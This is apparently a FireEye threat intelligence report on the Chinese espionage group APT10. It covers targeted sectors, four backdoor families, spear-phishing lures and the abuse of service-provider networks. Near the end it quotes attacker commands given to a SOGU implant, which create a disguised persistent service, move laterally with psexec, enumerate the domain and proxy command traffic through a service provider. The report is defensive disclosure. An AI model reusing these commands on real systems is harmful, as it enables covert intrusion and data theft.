APT10 Background

1/4

APT10 (MenuPass Group) is a Chinese cyber espionage group that FireEye has tracked
since 2009. They have historically targeted construction and engineering, aerospace, and
telecom firms, and governments in the United States, Europe, and Japan. We believe that
the targeting of these industries has been in support of Chinese national security goals,
including acquiring valuable military and intelligence information as well as the theft of
confidential business data to support Chinese corporations. PwC and BAE recently issued a
joint blog detailing extensive APT10 activity.
APT10’s Resurgence
In June 2016, FireEye iSIGHT intelligence first reported that APT10 expanded their
operations. The group was initially detected targeting a Japanese university, and more
widespread targeting in Japan was subsequently uncovered. Further collaboration between
FireEye as a Service (FaaS), Mandiant and FireEye iSIGHT intelligence uncovered
additional victims worldwide, a new suite of tools and novel techniques.
Global Targeting Using New Tools
Leveraging its global footprint, FireEye has detected APT10 activity across six continents in
2016 and 2017. APT10 has targeted or compromised manufacturing companies in India,
Japan and Northern Europe; a mining company in South America; and multiple IT service
providers worldwide. We believe these companies are a mix of final targets and
organizations that could provide a foothold in a final target.
APT10 unveiled new tools in its 2016/2017 activity. In addition to the continued use of
SOGU, the current wave of intrusions has involved new tools we believe are unique to
APT10. HAYMAKER and SNUGRIDE have been used as first stage backdoors, while
BUGJUICE and a customized version of the open source QUASARRAT have been used as
second stage backdoors. These new pieces of malware show that APT10 is devoting
resources to capability development and innovation.
HAYMAKER is a backdoor that can download and execute additional payloads in the
form of modules. It also conducts basic victim profiling activity, collecting the computer
name, running process IDs, %TEMP% directory path and version of Internet Explorer.
It communicates encoded system information to a single hard coded command and
control (C2) server, using the system’s default User-Agent string.
BUGJUICE is a backdoor that is executed by launching a benign file and then hijacking
the search order to load a malicious dll into it. That malicious dll then loads encrypted
shellcode from the binary, which is decrypted and runs the final BUGJUICE payload.
BUGJUICE defaults to TCP using a custom binary protocol to communicate with the
C2, but can also use HTTP and HTTPs if directed by the C2. It has the capability to find
files, enumerate drives, exfiltrate data, take screenshots and provide a reverse shell.

SNUGRIDE is a backdoor that communicates with its C2 server through HTTP
requests. Messages are encrypted using AES with a static key. The malware’s
capabilities include taking a system survey, access to the filesystem, executing
commands and a reverse shell. Persistence is maintained through a Run registry key.
QUASARRAT is an open-source RAT available here. The versions used by APT10
(1.3.4.0, 2.0.0.0, and 2.0.0.1) are not available via the public GitHub page, indicating
that APT10 has further customized the open source version. The 2.0 versions require a
dropper to decipher and launch the AES encrypted QUASARRAT payload.
QUASARRAT is a fully functional .NET backdoor that has been used by multiple cyber
espionage groups in the past.
Traditional and Novel Methods
This recent APT10 activity has included both traditional spear phishing and access to victim’s
networks through service providers. (For more information on infection via service providers
see M-Trends 2016). APT10 spear phishes have been relatively unsophisticated, leveraging
.lnk files within archives, files with double extensions (e.g.
“[Redacted]_Group_Meeting_Document_20170222_doc_.exe) and in some cases simply
identically named decoy documents and malicious launchers within the same archive.
In addition to the spear phishes, FireEye ISIGHT Intelligence has observed APT10
accessing victims through global service providers. Service providers have significant access
to customer networks, enabling an attacker who had compromised a service provider to
move laterally into the network of the service provider’s customer. In addition, web traffic
between a service provider’s customer and a service provider is likely to be viewed as
benign by network defenders at the customer, allowing the attacker to exfiltrate data
stealthily. A notable instance of this observed by FireEye involved a SOGU backdoor that
was set to communicate with its C2 through a server belonging to the victim’s service
provider.
APT10 actors issued the following commands to a SOGU implant at a victim:
sc create CorWrTool binPath= "\"C:\Windows\vss\vixDiskMountServer.exe\"" start=
auto displayname= "Corel Writing Tools Utility" type= own
sc description CorWrTool "Corel Graphics Corporation Applications."
ping -a [Redacted]
psexec.exe <orghost> d.exe
net view /domain:[Redacted]
proxyconnect - "port": 3389, "server": "[IP Address Redacted]"
These commands included setting persistence on the victim’s system. The actor then tested
connectivity to an IP managed by the victim’s service provider. Once connectivity to the
service provider IP was verified, the actor established the service provider IP as a proxy for
the victim’s SOGU backdoor. This effectively routes SOGU malware traffic through the
3/4

victim’s service provider, which likely indicates a foothold on the service provider’s network.
The tactic also serves to mask malicious C2 and exfiltration traffic and make it appear
innocuous.
Implications
APT10 is a threat to organizations worldwide. Their abuse of access to service provider
networks demonstrates that peripheral organizations continue to be of interest to a malicious
actor – especially those seeking alternative angles of attack. We believe the pace of APT10
operations may slow following the public disclosure by the PwC/BAE blog; however, we
believe they will return to their large-scale operations, potentially employing new tactics,
techniques and procedures.
